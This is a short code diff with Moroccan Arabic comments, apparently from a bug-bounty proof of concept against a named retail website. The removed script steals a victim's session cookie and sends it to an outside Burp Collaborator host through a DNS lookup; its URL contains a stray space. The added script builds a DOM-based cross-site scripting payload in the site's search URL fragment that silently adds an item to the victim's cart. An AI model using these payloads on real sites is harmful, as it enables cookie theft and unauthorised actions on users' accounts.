@@ -1,19 +1,14 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        (function(){
-            // 1. هز الـ OSID من الكوكيز
-            var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "null";
-            
-            // 2. نقّي الـ OSID من أي رموز خايبة باش يدوز فـ الـ DNS
-            var cleanOsid = osid.replace(/[^a-zA-Z0-9]/g, "");
-            
-            // 3. صيفط الـ OSID كـ Subdomain لـ Burp Collaborator
-            // هاد الطلب غيخلي Burp يتوصل بـ DNS Query فيه الـ OSID ديال الضحية
-            var dnsExfil = new Image();
-            dnsExfil.src = "https://" + cleanOsid + " 69do7uyfx5xwfbwl51bko3twnntehb50.oastify.com/logo.png";
-        })();
-    </script>
-</body>
-</html>
+<script>
+    // هاد الكود كيحاول يغير شي حاجة فـ الحساب ديال الضحية (مثلا كيزيد منتج للكارت)
+    let payload = `
+        fetch('/cart/add.js', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({items: [{id: 12345678, quantity: 1}]}) // كود منتج عشوائي
+        }).then(() => alert('Successfully manipulated user cart! Account Hijack Proof.'));
+    `;
+
+    let encoded = encodeURIComponent(payload);
+    // ديما كنخدمو بـ الـ Hash # حيت هو الساروت ديالك
+    window.location.href = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";
+</script>
